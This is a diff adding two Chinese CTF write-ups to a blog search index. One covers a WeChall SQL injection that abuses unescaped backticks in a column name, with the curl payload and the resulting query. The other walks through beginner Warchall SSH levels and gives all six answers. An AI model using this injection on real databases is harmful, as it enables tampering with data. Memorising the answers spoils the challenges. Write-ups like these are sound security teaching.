@@ -18226,4 +18226,90 @@ variables）模拟了这一机制。</p>
         <tag>php</tag>
       </tags>
   </entry>
+  <entry>
+    <title>WeChall - No Escape</title>
+    <url>/wp/WeChall/wechall-no-escape/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>在线投票系统，需要将任意候选人的票数设为 111。票数达到 100
+会自动重置。有源代码。</p>
+<h3 id="solution">Solution</h3>
+<p>源码中 <code>noesc_voteup()</code> 的关键漏洞：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$who</span> = GDO::<span class="title function_ invoke__">escape</span>(<span class="variable">$who</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE noescvotes SET `<span class="subst">$who</span>`=`<span class="subst">$who</span>`+1 WHERE id=1&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p><code>$who</code> 被直接插入到 SQL
+的列名位置（反引号内）。<code>GDO::escape()</code>
+只转义字符串值（引号等），但<strong>不转义反引号</strong>。</p>
+<p>防御代码仅检查了 <code>$who</code> 以 'id' 开头或含
+'/'，但未过滤反引号：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="title function_ invoke__">stripos</span>(<span class="variable">$who</span>, <span class="string">&#x27;id&#x27;</span>) === <span class="number">0</span>) || (<span class="title function_ invoke__">strpos</span>(<span class="variable">$who</span>, <span class="string">&#x27;/&#x27;</span>) !== <span class="literal">false</span>) ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Please do not mess with the id.&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用反引号注入闭合列名，用 <code>--</code> 注释掉后面的 SQL：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -b &#x27;WC=...&#x27; -g \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/no_escape/index.php?vote_for=scholz%60%3D111%20--%20&#x27;</span><br></pre></td></tr></table></figure>
+<p>URL 解码后 <code>vote_for=scholz</code>=111 -- `，执行的实际
+SQL：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> noescvotes <span class="keyword">SET</span> `scholz`<span class="operator">=</span><span class="number">111</span> <span class="comment">-- `=`scholz`=111 -- `+1 WHERE id=1</span></span><br></pre></td></tr></table></figure>
+<p><code>SET</code> 子句被截断为
+<code>SET</code>scholz<code>=111</code>，scholz 的票数直接设为 111。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>php</tag>
+        <tag>exploit</tag>
+        <tag>mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Training - Warchall - The Beginning</title>
+    <url>/wp/WeChall/wechall-warchall-training-the-beginning/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>Warchall 入门挑战。在 WeChall 挑战页面注册 SSH 账号，然后 SSH 登录
+Warchall
+服务器（<code>ssh -p 19198 &lt;username&gt;@warchall.net</code>），完成
+Level 0-5 六个初始关卡。答案以逗号分隔提交，格式为
+<code>Solution1,Solution2,Solution3,Solution4,Solution5,Solution6</code>（对应
+Level 0-5）。</p>
+<h3 id="solution">Solution</h3>
+<p>SSH 登录后，关卡目录在 <code>/home/level/</code>，每关还有一个副本在
+<code>~/level/</code>（你的 home 目录下）。</p>
+<p><strong>Level 0</strong> (<code>/home/level/00_welcome/</code>):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /home/level/00_welcome/README.md</span><br></pre></td></tr></table></figure>
+<p><strong>Level 1</strong>
+(<code>/home/level/01_choice_tree/</code>):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> /home/level/01_choice_tree/</span><br><span class="line">blue  green  README.md  red</span><br><span class="line">$ find /home/level/01_choice_tree/ -<span class="built_in">type</span> f</span><br><span class="line">/home/level/01_choice_tree/blue/hats/grey/solution/patience/SOLUTION.txt</span><br><span class="line">...</span><br><span class="line">$ <span class="built_in">cat</span> /home/level/01_choice_tree/blue/hats/grey/solution/patience/SOLUTION.txt</span><br></pre></td></tr></table></figure>
+<p>在目录树中探索，选择 <code>blue</code> 路径（提示: "become a gray
+hat"），深入到
+<code>blue/hats/grey/solution/patience/SOLUTION.txt</code>。</p>
+<p><strong>Level 2</strong> (<code>/home/level/02/</code>):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> /home/level/02/</span><br><span class="line">documents  photos</span><br><span class="line">$ <span class="built_in">ls</span> -al /home/level/02/</span><br><span class="line">drwxr-xr-x  2 root level02 4096 Jan 10  2023 documents</span><br><span class="line">drwxr-xr-x  2 root level02 4096 Jan 11  2023 photos</span><br><span class="line">drwxr-xr-x  2 root level02 4096 Jan 11  2023 .porb</span><br><span class="line">$ <span class="built_in">cat</span> /home/level/02/.porb/.solution</span><br></pre></td></tr></table></figure>
+<p><code>ls</code> 看不到答案，用 <code>ls -al</code> 发现隐藏目录
+<code>.porb</code>。</p>
+<p><strong>Level 3</strong> (<code>/home/level/03/</code>):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /home/level/03/.bash_history</span><br><span class="line">The solution to SSH3 is: RepeatingHistory</span><br></pre></td></tr></table></figure>
+<p>读取 <code>.bash_history</code> 文件直接获得答案。</p>
+<p><strong>Level 4</strong> (<code>/home/level/04_kwisatz/</code>):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /home/level/04_kwisatz/README.nfo</span><br><span class="line">Look <span class="keyword">in</span> your ~</span><br><span class="line">$ <span class="built_in">ls</span> -la ~/level/04_kwisatz/</span><br><span class="line">---------- 1 &lt;username&gt; &lt;username&gt; 248 Jun  4 05:02 README2.md</span><br><span class="line">-rw-r--r-- 1 &lt;username&gt; &lt;username&gt; 140 Jun  4 05:02 README.txt</span><br><span class="line">$ <span class="built_in">chmod</span> u+r ~/level/04_kwisatz/README2.md</span><br><span class="line">$ <span class="built_in">cat</span> ~/level/04_kwisatz/README2.md</span><br></pre></td></tr></table></figure>
+<p>README.nfo 提示看 home
+目录。<code>~/level/04_kwisatz/README2.md</code> 权限为
+<code>----------</code>（无任何权限），但文件所有者是自己，用
+<code>chmod u+r</code> 添加读权限。</p>
+<p><strong>Level 5</strong> (<code>/home/level/05_privacy/</code>):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /home/level/05_privacy/README.md</span><br><span class="line"><span class="comment"># WAR#5: Privacy</span></span><br><span class="line">Please protect your ~ from any other people than yourself.</span><br><span class="line">The 5th solution is <span class="string">&quot;OKPRIVATE&quot;</span> without the quotes.</span><br></pre></td></tr></table></figure>
+<p>README 直接给出答案。实际操作是用 <code>chmod 700 ~</code> 保护 home
+目录不被其他用户访问。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">bitwarrior,patience,HiddenIsConfig,RepeatingHistory,AndOfCourseIDoKnowChown,OKPRIVATE</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>linux</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>warchall</tag>
+      </tags>
+  </entry>
 </search>
